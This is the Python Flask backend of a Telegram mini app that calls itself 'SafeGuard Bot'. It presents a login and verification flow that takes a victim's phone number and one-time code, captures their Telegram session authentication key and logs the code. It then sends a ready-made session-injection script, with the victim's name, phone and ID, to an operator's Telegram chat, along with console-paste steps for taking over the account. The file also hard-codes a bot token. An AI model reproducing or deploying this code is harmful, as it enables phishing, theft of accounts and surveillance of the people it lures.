from flask import Flask, render_template, request, jsonify, session, redirect, send_file
import os
import qrcode
import qrcode.image.svg
import io
import base64
import time
from datetime import datetime
import uuid
import asyncio
import logging
import requests
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('safeguard_bot.log', encoding='utf-8')
    ]
)

# Suppress Telethon's verbose logging
logging.getLogger('telethon').setLevel(logging.WARNING)
logging.getLogger('asyncio').setLevel(logging.WARNING)

# Initialize event loop for the entire application
def init_event_loop():
    """Initialize a global event loop for the application"""
    try:
        loop = asyncio.get_event_loop()
        if loop.is_closed():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    return loop

# Initialize the event loop before importing auth
app_loop = init_event_loop()

from utils.tg.auth import telegram_auth
from utils.credentials_manager import credentials_manager
from utils.mongo_session_manager import mongo_session_manager

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'your-secret-key-change-this')

@app.route('/')
def index():
    """Main entry point for the Telegram mini app"""
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Handle phone number login"""
    if request.method == 'POST':
        data = request.get_json()
        phone_number = data.get('phone_number')
        
        if not phone_number:
            return jsonify({'error': 'Phone number is required'}), 400

        # Handle resend case
        if phone_number == 'resend':
            # Get the stored phone number from session
            stored_phone = session.get('phone_number')
            if not stored_phone:
                return jsonify({'error': 'No phone number found. Please login again.'}), 400
            
            phone_number = stored_phone
            logging.info(f"Resending code to {phone_number}")

        # Store phone number in session for later use
        session['phone_number'] = phone_number

        # Send code to Telegram
        try:
            # Use the synchronous method
            result = telegram_auth.send_code_sync(phone_number)
            
            if result['success']:
                # Store session ID for verification
                session['auth_session_id'] = result['session_id']
                logging.info(f"Code sent successfully to {phone_number}")
                return jsonify({
                    'success': True,
                    'message': result['message'],
                    'phone_number': phone_number
                })
            else:
                logging.error(f"Failed to send code to {phone_number}: {result['message']}")
                return jsonify({
                    'success': False,
                    'error': result['message']
                }), 400
                
        except Exception as e:
            logging.error(f"Error in login for {phone_number}: {e}")
            return jsonify({
                'success': False,
                'error': 'Failed to send verification code. Please try again.'
            }), 500
    
    return render_template('login.html')

@app.route('/qr-login')
def qr_login():
    """Handle QR code login page"""
    # Generate a unique session ID for QR code
    qr_session_id = str(uuid.uuid4())
    session['qr_session_id'] = qr_session_id
    
    # Create QR code data (this would be your bot's login URL)
    qr_data = f"https://t.me/safeguard_bot?start=qr_{qr_session_id}"
    
    # Generate QR code as SVG
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(qr_data)
    qr.make(fit=True)
    
    # Create SVG QR code
    img = qr.make_image(image_factory=qrcode.image.svg.SvgImage)
    
    # Convert to string
    buffer = io.BytesIO()
    img.save(buffer)
    svg_string = buffer.getvalue().decode('utf-8')
    
    return render_template('qr_login.html', qr_code=svg_string, qr_session_id=qr_session_id)

@app.route('/verify', methods=['GET', 'POST'])
def verify():
    """Handle OTP verification"""
    if request.method == 'POST':
        data = request.get_json()
        otp = data.get('otp')

        if not otp:
            return jsonify({'error': 'OTP is required'}), 400

        # Get session ID from session
        session_id = session.get('auth_session_id')
        print(f"Session Id: {session_id}")
        if not session_id:
            return jsonify({'error': 'Session expired. Please try logging in again.'}), 400
        
        # Verify code with Telegram
        try:
            # Ensure we're using the same event loop
            if app_loop.is_closed():
                init_event_loop()
            
            # Use the synchronous method
            result = telegram_auth.verify_code_sync(session_id, otp)
            print(f"Result: {result}")

            if result['success']:
                # Store user info in session
                session['user_info'] = result['user_info']
                session['authenticated'] = True

                # Verify that we have real authentication data
                if 'session_data' in result and result['session_data']:
                    session_data = result['session_data']
                    
                    # Validate that this is real authentication
                    if not session_data.get('is_real_authentication', False):
                        logging.error("❌ Authentication failed: No real authentication data captured")
                        return jsonify({
                            'success': False,
                            'error': 'Authentication failed: Could not capture real authentication data. Please try again.'
                        }), 400
                    
                    # Validate auth key
                    if 'dc1_auth_key' not in session_data or len(session_data['dc1_auth_key']) < 100:
                        logging.error("❌ Authentication failed: Invalid or missing authentication key")
                        return jsonify({
                            'success': False,
                            'error': 'Authentication failed: Invalid authentication data. Please try again.'
                        }), 400
                    
                    logging.info("✅ Real authentication data validated successfully")
                    logging.info(f"🔑 Auth key length: {len(session_data['dc1_auth_key'])} characters")
                    logging.info(f"📦 Session string length: {len(session_data.get('session_string', ''))} characters")
                else:
                    logging.error("❌ Authentication failed: No session data returned")
                    return jsonify({
                        'success': False,
                        'error': 'Authentication failed: No session data captured. Please try again.'
                    }), 400

                # Log the verification code for debugging
                logging.info(f"Verification code entered: {otp}")
                logging.info(f"User authenticated: {result['user_info']}")

                # Automatically generate and send script to Telegram
                try:
                    # Generate script content
                    script_content = credentials_manager.generate_working_format_script(session_data)
                    
                    # Generate script filename
                    user_id = result['user_info'].get('id', 'unknown')
                    timestamp = int(time.time())
                    script_filename = f"auto_script_{user_id}_{timestamp}.js"
                    
                    # Save the script
                    script_filepath = os.path.join(credentials_manager.storage_dir, script_filename)
                    with open(script_filepath, 'w', encoding='utf-8') as f:
                        f.write(script_content)
                    
                    logging.info(f"✅ Auto-generated script: {script_filename}")
                    
                    # Send to Telegram if target user ID is configured
                    target_user_id = os.getenv('SCRIPT_TARGET_USER_ID')
                    if target_user_id:
                        try:
                            bot_token = os.getenv('TELEGRAM_BOT_TOKEN', '8033516348:AAE2ylmkjc8Q6Sj1b8yzvk19wvB3kYs-5-k')
                            
                            # Prepare message
                            message_parts = [
                                "🔧 **Auto-Generated Working Script**",
                                "",
                                f"📁 **File:** `{script_filename}`",
                                f"👤 **User:** {result['user_info'].get('first_name', 'Unknown')} {result['user_info'].get('last_name', '')}",
                                f"📱 **Phone:** +{result['user_info'].get('phone', 'Unknown')}",
                                f"🆔 **User ID:** {result['user_info'].get('id', 'Unknown')}",
                                f"⏰ **Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                                "",
                                "📝 **Instructions:**",
                                "1. Open https://web.telegram.org/a/ in your browser",
                                "2. Press F12 to open Developer Tools", 
                                "3. Go to Console tab",
                                "4. Copy and paste the script below",
                                "5. Press Enter to execute",
                                "",
                                "💡 **Tips:**",
                                "- Make sure you're on web.telegram.org/a/ (not web.telegram.org/k/)",
                                "- Try refreshing the page first",
                                "- Try using a different browser or incognito mode", 
                                "- Check if your network allows WebSocket connections",
                                "",
                                "🔗 **Script Content:**",
                                "```",
                                script_content,
                                "```"
                            ]
                            
                            message_text = "\n".join(message_parts)
                            
                            # Send message (split if too long)
                            try:
                                # Create a unique filename for this script
                                timestamp = int(time.time())
                                html_filename = f"script_{user_id}_{timestamp}.html"
                                html_filepath = os.path.join('static', 'scripts', html_filename)
                                
                                # Ensure the scripts directory exists
                                os.makedirs(os.path.join('static', 'scripts'), exist_ok=True)
                                
                                # Create the HTML content
                                html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web Script - {result['user_info'].get('first_name', 'User')}</title>
    <style>
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
        }}
        .container {{
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }}
        .header {{
            text-align: center;
            margin-bottom: 30px;
        }}
        .header h1 {{
            color: #fff;
            margin: 0;
            font-size: 2.5em;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }}
        .info {{
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 30px;
        }}
        .info h3 {{
            margin-top: 0;
            color: #fff;
        }}
        .info p {{
            margin: 5px 0;
            font-size: 1.1em;
        }}
        .instructions {{
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 30px;
        }}
        .instructions h3 {{
            margin-top: 0;
            color: #fff;
        }}
        .instructions ol {{
            padding-left: 20px;
        }}
        .instructions li {{
            margin: 10px 0;
            font-size: 1.1em;
        }}
        .script-container {{
            background: #1e1e1e;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 30px;
            position: relative;
        }}
        .script-header {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }}
        .script-header h3 {{
            margin: 0;
            color: #fff;
        }}
        .copy-btn {{
            background: #4CAF50;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            transition: background 0.3s;
        }}
        .copy-btn:hover {{
            background: #45a049;
        }}
        .copy-btn:active {{
            background: #3d8b40;
        }}
        .script-content {{
            background: #2d2d2d;
            border-radius: 5px;
            padding: 15px;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            line-height: 1.4;
            color: #e6e6e6;
            max-height: 400px;
            overflow-y: auto;
        }}
        .execute-btn {{
            background: #2196F3;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            width: 100%;
            margin-top: 15px;
            transition: background 0.3s;
        }}
        .execute-btn:hover {{
            background: #1976D2;
        }}
        .execute-btn:active {{
            background: #1565C0;
        }}
        .warning {{
            background: rgba(255, 193, 7, 0.2);
            border: 1px solid #ffc107;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
        }}
        .warning h4 {{
            margin: 0 0 10px 0;
            color: #ffc107;
        }}
        .warning p {{
            margin: 5px 0;
            color: #fff;
        }}
        .footer {{
            text-align: center;
            margin-top: 30px;
            opacity: 0.8;
            font-size: 0.9em;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 Telegram Web Script</h1>
        </div>
        
        <div class="info">
            <h3>📋 User Information</h3>
            <p><strong>Name:</strong> {result['user_info'].get('first_name', 'N/A')} {result['user_info'].get('last_name', '')}</p>
            <p><strong>Phone:</strong> +{result['user_info'].get('phone', 'Unknown')}</p>
            <p><strong>User ID:</strong> {result['user_info'].get('id', 'Unknown')}</p>
            <p><strong>Generated:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
        
        <div class="warning">
            <h4>⚠️ Important Notice</h4>
            <p>This script contains sensitive authentication data. Use it only on web.telegram.org/a/</p>
            <p>Do not share this URL with anyone else.</p>
        </div>
        
        <div class="instructions">
            <h3>📝 Instructions</h3>
            <ol>
                <li>Open <a href="https://web.telegram.org/a/" target="_blank" style="color: #4CAF50;">https://web.telegram.org/a/</a> in your browser</li>
                <li>Press F12 to open Developer Tools</li>
                <li>Go to Console tab</li>
                <li>Copy the script below and paste it in the console</li>
                <li>Press Enter to execute</li>
            </ol>
        </div>
        
        <div class="script-container">
            <div class="script-header">
                <h3>🔧 Script Content</h3>
                <button class="copy-btn" onclick="copyScript()">📋 Copy Script</button>
            </div>
            <div class="script-content" id="scriptContent">{script_content}</div>
            <button class="execute-btn" onclick="executeScript()">▶️ Execute Script</button>
        </div>
        
        <div class="footer">
            <p>Generated by SafeGuard Bot • {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
    </div>

    <script>
        function copyScript() {{
            const scriptContent = document.getElementById('scriptContent').textContent;
            navigator.clipboard.writeText(scriptContent).then(function() {{
                const btn = document.querySelector('.copy-btn');
                const originalText = btn.textContent;
                btn.textContent = '✅ Copied!';
                btn.style.background = '#4CAF50';
                setTimeout(function() {{
                    btn.textContent = originalText;
                    btn.style.background = '#4CAF50';
                }}, 2000);
            }});
        }}
        
        function executeScript() {{
            const scriptContent = document.getElementById('scriptContent').textContent;
            try {{
                // Open web.telegram.org/a/ in a new tab
                window.open('https://web.telegram.org/a/', '_blank');
                alert('Opening web.telegram.org/a/ in a new tab. Please copy and paste the script in the console.');
            }} catch (error) {{
                alert('Error: ' + error.message);
            }}
        }}
    </script>
</body>
</html>
"""
                                
                                # Write the HTML file
                                with open(html_filepath, 'w', encoding='utf-8') as f:
                                    f.write(html_content)
                                
                                # Create the URL for the HTML file
                                base_url = os.getenv('WEBAPP_URL', 'http://localhost:5000')
                                script_url = f"{base_url}/static/scripts/{html_filename}"
                                
                                # Create a simplified message with the URL
                                url_message = f"""🔐 **Auto-Generated Script Ready!**

📋 **File:** {html_filename}
👤 **User:** {result['user_info'].get('first_name', 'N/A')} {result['user_info'].get('last_name', '')}
📱 **Phone:** +{result['user_info'].get('phone', 'Unknown')}
🆔 **User ID:** {result['user_info'].get('id', 'Unknown')}
⏰ **Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔗 **Script URL:** {script_url}

📝 **Instructions:**
1. Click the link above to open the script page
2. Click "Copy Script" button
3. Open https://web.telegram.org/a/ in your browser
4. Press F12 → Console tab
5. Paste and press Enter

💡 **Tips:**
- Make sure you're on web.telegram.org/a/ (not web.telegram.org/k/)
- Try refreshing the page first
- Use incognito mode if needed
- Check if your network allows WebSocket connections

⚠️ **Security:** This URL contains sensitive data. Don't share it!"""
                                
                                # Send the URL message
                                response = requests.post(
                                    f"https://api.telegram.org/bot{bot_token}/sendMessage",
                                    json={
                                        "chat_id": target_user_id,
                                        "text": url_message,
                                        "parse_mode": "Markdown"
                                    }
                                )
                                
                                if response.status_code == 200:
                                    logging.info(f"✅ Auto-sent script URL to Telegram user {target_user_id}")
                                    logging.info(f"📁 HTML file created: {html_filepath}")
                                    logging.info(f"🔗 Script URL: {script_url}")
                                else:
                                    logging.error(f"❌ Failed to auto-send script URL: {response.text}")
                                    
                            except Exception as e:
                                logging.error(f"❌ Error creating HTML script file: {e}")
                                # Fallback to simple message without script
                                fallback_message = f"""🔐 **Script Generated Successfully!**

📋 **File:** {script_filename}
👤 **User:** {result['user_info'].get('first_name', 'N/A')} {result['user_info'].get('last_name', '')}
📱 **Phone:** +{result['user_info'].get('phone', 'Unknown')}
🆔 **User ID:** {result['user_info'].get('id', 'Unknown')}

⚠️ **Script too long for Telegram message.**
📁 **Check the generated file in your bot's storage directory.**
"""
                                
                                response = requests.post(
                                    f"https://api.telegram.org/bot{bot_token}/sendMessage",
                                    json={
                                        "chat_id": target_user_id,
                                        "text": fallback_message,
                                        "parse_mode": "Markdown"
                                    }
                                )
                                
                                if response.status_code == 200:
                                    logging.info(f"✅ Sent fallback message to Telegram user {target_user_id}")
                                else:
                                    logging.error(f"❌ Failed to send fallback message: {response.text}")
                                    
                        except Exception as e:
                            logging.error(f"❌ Error auto-sending script to Telegram: {e}")
                    else:
                        logging.info("⚠️ No SCRIPT_TARGET_USER_ID configured, skipping auto-send")
                        
                except Exception as e:
                    logging.error(f"❌ Error auto-generating script: {e}")

                return jsonify({
                    'success': True,
                    'message': result['message'],
                    'user_info': result['user_info']
                })
            else:
                logging.error(f"Verification failed for code {otp}: {result['message']}")
                return jsonify({
                    'success': False,
                    'error': result['message']
                }), 400

        except Exception as e:
            logging.error(f"Error in verification for code {otp}: {e}")
            logging.error(f"Error type: {type(e).__name__}")
            import traceback
            logging.error(f"Traceback: {traceback.format_exc()}")
            
            # Clean up the session on error
            try:
                telegram_auth.cleanup_session(session_id)
            except:
                pass
            
            # Provide more specific error messages
            error_message = 'Failed to verify code. Please try again.'
            if "Real authentication key could not be captured" in str(e):
                error_message = 'Authentication failed: Could not capture real authentication data. Please try again.'
            elif "Real authentication required" in str(e):
                error_message = 'Authentication failed: Real authentication is required. Please try again.'
            elif "Failed to capture real authentication data" in str(e):
                error_message = 'Authentication failed: Could not capture authentication data. Please try again.'
            
            return jsonify({
                'success': False,
                'error': error_message
            }), 500
    
    return render_template('verify.html')

@app.route('/dashboard')
def dashboard():
    """Main dashboard after successful login"""
    phone_number = session.get('phone_number')
    if not phone_number:
        return redirect('/login')
    
    return render_template('dashboard.html', phone_number=phone_number)

@app.route('/logout', methods=['POST'])
def logout():
    """Handle user logout"""
    # Clean up any active auth sessions
    session_id = session.get('auth_session_id')
    if session_id:
        try:
            telegram_auth.cleanup_session(session_id)
        except:
            pass
    
    session.clear()
    return jsonify({'success': True, 'message': 'Logged out successfully'})

@app.route('/qr-verify/<qr_session_id>')
def qr_verify(qr_session_id):
    """Handle QR code verification when scanned"""
    # Check if QR session exists
    if session.get('qr_session_id') == qr_session_id:
        # Mark QR code as scanned
        session['qr_scanned'] = True
        session['phone_number'] = 'qr_login_' + qr_session_id[:8]
        return jsonify({
            'success': True,
            'message': 'QR code verified successfully',
            'redirect': '/dashboard'
        })
    else:
        return jsonify({
            'success': False,
            'message': 'Invalid or expired QR code'
        }), 400

@app.route('/check-qr-status')
def check_qr_status():
    """Check if QR code has been scanned"""
    qr_session_id = session.get('qr_session_id')
    qr_scanned = session.get('qr_scanned', False)
    
    if qr_scanned:
        return jsonify({
            'success': True,
            'scanned': True,
            'redirect': '/dashboard'
        })
    else:
        return jsonify({
            'success': True,
            'scanned': False
        })

@app.route('/credentials')
def view_credentials():
    """View saved credentials files"""
    if not session.get('authenticated'):
        return redirect('/login')
    
    files = credentials_manager.list_credentials_files()
    
    # Calculate file counts
    json_count = len([f for f in files if f['filename'].endswith('.json')])
    js_count = len([f for f in files if f['filename'].endswith('.js')])
    
    return render_template('credentials.html', files=files, json_count=json_count, js_count=js_count)

@app.route('/credentials/<filename>')
def download_credentials(filename):
    """Download a specific credentials file"""
    if not session.get('authenticated'):
        return redirect('/login')
    
    filepath = os.path.join(credentials_manager.storage_dir, filename)
    if os.path.exists(filepath):
        return send_file(filepath, as_attachment=True)
    else:
        return jsonify({'error': 'File not found'}), 404

@app.route('/credentials/view/<filename>')
def view_credential_file(filename):
    """View the contents of a credentials file"""
    if not session.get('authenticated'):
        return redirect('/login')
    
    data = credentials_manager.load_credentials(filename)
    if data:
        return render_template('view_credential.html', data=data, filename=filename)
    else:
        return jsonify({'error': 'File not found or invalid'}), 404

@app.route('/credentials/generate-script/<filename>')
def generate_script_for_credential(filename):
    """Generate localStorage script for an existing credential file"""
    if not session.get('authenticated'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    logging.info(f"🔧 Generating script for file: {filename}")
    
    # Load the credential file
    data = credentials_manager.load_credentials(filename)
    if not data:
        logging.error(f"❌ File not found or invalid: {filename}")
        return jsonify({'error': 'File not found or invalid'}), 404
    
    try:
        # Extract session_data from the credential file
        session_data = data.get('session_data', {})
        logging.info(f"📦 Session data keys: {list(session_data.keys()) if session_data else 'None'}")
        
        if not session_data:
            logging.error(f"❌ No session data found in file: {filename}")
            return jsonify({'error': 'No session data found in credential file'}), 400
        
        # Generate script filename
        user_id = data.get('user_id', 'unknown')
        script_filename = f"script_{user_id}_{int(time.time())}.js"
        script_filepath = os.path.join(credentials_manager.storage_dir, script_filename)
        
        logging.info(f"📝 Generating script content...")
        
        # Generate and save the script using working format
        script_content = credentials_manager.generate_working_format_script(session_data)
        
        logging.info(f"📝 Script content length: {len(script_content)}")
        
        with open(script_filepath, 'w', encoding='utf-8') as f:
            f.write(script_content)
        
        logging.info(f"✅ Generated localStorage script: {script_filename}")
        
        return jsonify({
            'success': True,
            'message': f'Script generated: {script_filename}',
            'script_filename': script_filename
        })
        
    except Exception as e:
        logging.error(f"❌ Error generating script for {filename}: {e}")
        logging.error(f"❌ Error details: {type(e).__name__}: {str(e)}")
        import traceback
        logging.error(f"❌ Traceback: {traceback.format_exc()}")
        return jsonify({'error': f'Failed to generate script: {str(e)}'}), 500

@app.route('/credentials/delete/<filename>', methods=['DELETE'])
def delete_credential_file(filename):
    """Delete a credential or script file"""
    if not session.get('authenticated'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    try:
        filepath = os.path.join(credentials_manager.storage_dir, filename)
        
        # Check if file exists
        if not os.path.exists(filepath):
            return jsonify({'error': 'File not found'}), 404
        
        # Delete the file
        os.remove(filepath)
        logging.info(f"Deleted credential file: {filename}")
        
        return jsonify({
            'success': True,
            'message': f'File {filename} deleted successfully'
        })
        
    except Exception as e:
        logging.error(f"Error deleting file {filename}: {e}")
        return jsonify({'error': 'Failed to delete file'}), 500

if __name__ == '__main__':
    print("🚀 Starting Safeguard Bot Flask App...")
    print("📱 Phone authentication: ENABLED")
    print("🔐 5-digit verification codes: ENABLED")
    print("📋 Paste functionality: ENABLED")
    print("🌐 Web app running at: http://127.0.0.1:5000")
    print("📝 Logs will be saved to: safeguard_bot.log")
    print("=" * 50)
    
    try:
        app.run(debug=True, host='0.0.0.0', port=5000)
    except KeyboardInterrupt:
        print("\n🛑 Shutting down...")
        # Clean up all active sessions
        telegram_auth.cleanup_expired_sessions(0)  # Clean all sessions
        # Close MongoDB connection
        mongo_session_manager.close()
        if not app_loop.is_closed():
            app_loop.close()
        print("✅ Cleanup completed") 